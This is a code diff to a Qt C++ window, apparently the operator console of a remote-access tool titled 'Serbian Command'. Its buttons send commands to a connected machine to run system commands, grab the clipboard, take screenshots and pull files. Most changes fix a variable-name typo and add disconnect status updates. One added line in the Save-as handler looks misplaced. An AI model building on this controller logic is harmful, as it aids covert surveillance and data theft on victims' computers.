@@ -15,7 +15,7 @@ MainWindow::MainWindow(QWidget *parent)
     this->statusBar()->addWidget(statusLabel);
     this->loadedFile = nullptr;
 
-    this->networdHandler = NIL;
+    this->networkHandler = NIL;
 
     //Network setup
     this->clientSocket = new QTcpSocket(this);
@@ -68,7 +68,7 @@ void MainWindow::on_clipboardButton_clicked()
     QString cmd = QString("CLP");
     resetStatusTimer(3);
 
-    this->networdHandler = CLP;
+    this->networkHandler = CLP;
     sendCmd(cmd);
 }
 
@@ -126,7 +126,7 @@ void MainWindow::on_sendCmdButton_clicked()
     resetStatusTimer(3);
     sendCmd(cmd);
     this->ui->cmdLine->setText("");
-    this->networdHandler = SYS;
+    this->networkHandler = SYS;
 }
 
 /**
@@ -149,7 +149,7 @@ void MainWindow::on_extractButton_clicked()
    resetStatusTimer(3);
    sendCmd(cmd);
    this->ui->fileLine->setText("");
-   this->networdHandler = EXT;
+   this->networkHandler = EXT;
 }
 
 /**
@@ -165,7 +165,7 @@ void MainWindow::on_screenshotButton_clicked()
   QString cmd = QString("SCR");
   resetStatusTimer(3);
   sendCmd(cmd);
-  this->networdHandler = SCR;
+  this->networkHandler = SCR;
 }
 
 /**
@@ -234,8 +234,8 @@ void MainWindow::on_actionSave_triggered()
  * @brief MainWindow::on_actionSave_as_triggered Displays a "Save as ..." window, and writes data to file
  */
 void MainWindow::on_actionSave_as_triggered()
-{
-  QString fileName = QFileDialog::getSaveFileName(this,tr("Open Database"), "",tr("Virus database (*.vdb)"));
+{this->ui->tableWidget->setItem(this->connectedMachine, 2, new QTableWidgetItem("Disconnected"));
+  QString fileName = QFileDialog::getSaveFileName(this,tr("Save Database"), "",tr("Virus database (*.vdb)"));
   QFile *saveFile = new QFile(fileName);
   if (!saveFile->open(QIODevice::WriteOnly)) {
       qWarning("Couldn't open save file.");
@@ -324,6 +324,8 @@ void MainWindow::displayError(QTcpSocket::SocketError socketError)
         this->statusLabel->setText(this->selectedMachineName + ": Error");
         QMessageBox::information(this, "Serbian Command", "The following error occurred:" + (this->clientSocket->errorString()));
     }
+    this->ui->tableWidget->setItem(this->connectedMachine, 2, new QTableWidgetItem("Disconnected"));
+    this->ui->connectButton->setText("Connect");
     this->clientSocket->disconnectFromHost();
     resetStatusTimer(5);
 }
@@ -334,7 +336,7 @@ void MainWindow::displayError(QTcpSocket::SocketError socketError)
 void MainWindow::read(){
   QString returnStr = QByteArray::fromBase64(this->clientSocket->readAll());
 
-  switch (this->networdHandler) {
+  switch (this->networkHandler) {
     case SYS:
       {
         TextDisplayWindows* c = new TextDisplayWindows(this, returnStr);
@@ -350,7 +352,7 @@ void MainWindow::read(){
       }
     case EXT:
       {
-        QString fileName = QFileDialog::getSaveFileName(this,tr("Open Database"), "",tr("Virus database (*.vdb)"));
+        QString fileName = QFileDialog::getSaveFileName(this,tr("Save as..."), "",tr("*"));
         QFile *saveFile = new QFile(fileName);
         if (!saveFile->open(QIODevice::WriteOnly)) {
             qWarning("Couldn't open save file.");
@@ -367,7 +369,7 @@ void MainWindow::read(){
       break;
   }
 
-  this->networdHandler = NIL;
+  this->networkHandler = NIL;
 }
 
 /**
